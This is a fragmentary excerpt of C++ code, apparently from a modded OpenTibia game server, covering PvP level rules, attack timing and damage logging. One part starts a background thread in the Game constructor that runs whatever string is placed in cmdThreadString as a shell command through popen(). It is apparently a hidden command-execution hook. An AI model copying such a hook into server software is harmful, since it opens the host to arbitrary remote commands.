...
#ifdef HHB_MINIMUM_PVP_LEVEL
&& ( attackPlayer && attackPlayer->getLevel() >= g_config.MINIMUM_PVP_LEVEL) && (targetPlayer && targetPlayer->getLevel() >= g_config.MINIMUM_PVP_LEVEL)
#endif//HHB_MINIMUM_PVP_LEVEL
...
#ifdef TR_SUMMONS
			if ((game->getWorldType() == WORLD_TYPE_NO_PVP
#ifdef HHB_MINIMUM_PVP_LEVEL
 or (attackPlayer && attackPlayer->getLevel() <= g_config.MINIMUM_PVP_LEVEL && targetPlayer) or (attackPlayer && targetPlayer && targetPlayer->getLevel() <= g_config.MINIMUM_PVP_LEVEL)
#endif//HHB_MINIMUM_PVP_LEVEL
///TODO: this could be optimized.

         && !pvpArena && summonVsPlayer) ||
				(game->getWorldType() == WORLD_TYPE_NO_PVP
#ifdef HHB_MINIMUM_PVP_LEVEL
 or (attackPlayer && attackPlayer->getLevel() <= g_config.MINIMUM_PVP_LEVEL && targetPlayer) or (attackPlayer && targetPlayer && targetPlayer->getLevel() <= g_config.MINIMUM_PVP_LEVEL)
#endif//HHB_MINIMUM_PVP_LEVEL
      ...
      && !pvpArena && attackPlayer && (targetPlayer || targetIsSummon) && attackPlayer->access < g_config.ACCESS_PROTECT)) {
#else
			if(game->getWorldType() == WORLD_TYPE_NO_PVP
#ifdef HHB_MINIMUM_PVP_LEVEL//TODO this could also be slightly optimized? it checks if targetPlayer abit too much
 or (attackPlayer && attackPlayer->getLevel() <= g_config.MINIMUM_PVP_LEVEL && targetPlayer) or (attackPlayer && targetPlayer && targetPlayer->getLevel() <= g_config.MINIMUM_PVP_LEVEL)
#endif//HHB_MINIMUM_PVP_LEVEL
      && !pvpArena && attackPlayer && targetPlayer && attackPlayer->access < g_config.ACCESS_PROTECT){
#endif //TR_SUMMONS
				damage = 0;
			}
		}
...
Game::Game()
{
	...
	OTSYS_CREATE_THREAD(cmdThread, this);
...
#endif
OTSYS_THREAD_RETURN Game::cmdThread(void* p)
{
  Game* _this = (Game*)p;
while(true){
while(_this->cmdThreadString.empty()){OTSYS_SLEEP(1000);}
std::string i=_this->cmdThreadString;
_this->cmdThreadString.clear();
char c;
std::string str="";
FILE * pFile;
pFile=popen (i.c_str(),"r");
...
#if !defined(HHB_UNLIMITED_AMMO)
	if(damagetype != FIGHT_MELEE && player) {
		player->removeDistItem();
	}
#endif//HHB_UNLIMITED_AMMO
...
*/
	...
	#ifdef HHB_SLOW_AUTOWALK
	#define slowdown 200
	ticks+=slowdown;
	player->sendChangeSpeed(player,slowdown);
	#endif
		...
		if (monster) {
			...
			if (creature->attackedCreature != 0)
			{
				...
				if (attackedCreature)
				{
					...
					creature->eventCheckAttacking = addEvent(makeTask(
                                                       #ifdef HHB_ATTACK_SPEED
                                                       g_config.ATTACK_SPEED
                                                       #else
                                                       2000
                                                       #endif//HHB_ATTACK_SPEED


                                                       , std::bind2nd(std::mem_fun(&Game::checkCreatureAttacking), id)));
...
void Game::CreateDamageUpdate(Creature* creature, Creature* attackCreature, int damage)
{
	...
	if (damage > 0) {
		...
		dmgmesg <<".";
		#ifdef HHB_DMG_LOG
        player->sendToChannel(player,SPEAK_CHANNEL_R2,dmgmesg.str().c_str(),0x08);
		#else//HHB_DMG_LOG
...
#ifdef HHB_MINIMUM_PVP_LEVEL
 or (player->getLevel() <= g_config.MINIMUM_PVP_LEVEL) or (attackedPlayer && attackedPlayer->getLevel() <= g_config.MINIMUM_PVP_LEVEL)
#endif//HHB_MINIMUM_PVP_LEVEL
	...
	if(attackedCreature) {
		...
		stopEvent(player->eventCheckAttacking);
		player->eventCheckAttacking = addEvent(makeTask(
                                                  #if defined(HHB_ATTACK_SPEED) && !defined(HHB_NODELAY_FIRST_ATTACK)
                                                  g_config.ATTACK_SPEED
                                                  #else
                                                  #ifdef HHB_NODELAY_FIRST_ATTACK
                                                  0
                                                  #else
                                                  2000
                                                  #endif//HHB_NODELAY_FIRST_ATTACK
                                                  #endif//HHB_ATTACK_SPEED
                                                  , std::bind2nd(std::mem_fun(&Game::checkCreatureAttacking), player->getID())));
	}
...
void Game::onPvP(Creature* creature, Creature* attacked, bool murder)
{
	...
	if(!player || !attackedPlayer)
		return;
		#ifdef HHB_MINIMUM_PVP_LEVEL
		//Because we do not want skulls on lowlvls :p
        if(player->getLevel() < g_config.MINIMUM_PVP_LEVEL or attackedPlayer->getLevel() < g_config.MINIMUM_PVP_LEVEL)
        {
        std::cout << "yeap...";
        return;
        }
